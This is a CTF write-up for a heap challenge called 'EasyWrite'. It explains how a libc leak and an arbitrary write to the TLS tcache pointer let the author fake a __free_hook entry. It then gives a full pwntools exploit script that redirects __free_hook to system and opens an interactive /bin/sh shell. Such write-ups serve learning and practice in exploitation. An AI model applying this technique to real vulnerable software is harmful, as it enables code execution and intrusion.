# EasyWrite

- The challenge is simple. It provides us with a libc leak at first.
- Then it does malloc(0x300) and allow us to do an arbirary heap write anywhere.
- SO i just overwrite the fs[12] which stores the tcache_structure address.
- The challenge then later does malloc(0x30) write data to the returned pointer and free.
- After i overwrote fs[12] #(.tls) when we malloc glibc will take the address of  pointer which we overwrite as tcach_structure, which we control. So i just faked a `__free_hook` entry and get AAW primitive.

## Exploit

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Addr libc 2.31
__free_hook = 0x1eeb28
tls_tcache = 0x1f34f0
system = 0x55410

#Exploit
if __name__ == '__main__':

	io = process('./easywrite')
#	io = remote('124.156.183.246',20000)
	libc_base = int(io.recvline().strip().split(b':')[1],0)-0x8ec50
	print(hex(libc_base))
	__FUK = p64(0x0000000100000000)+p64(0)+\
		p64(0)*0x10+p64(libc_base+__free_hook-0x8)

	io.sendafter('Input your message:',__FUK)

	io.sendafter('Where to write?:',p64(libc_base+tls_tcache))
	io.sendafter('message?:',b'/bin/sh\0'+p64(libc_base+system))
	io.interactive()
```
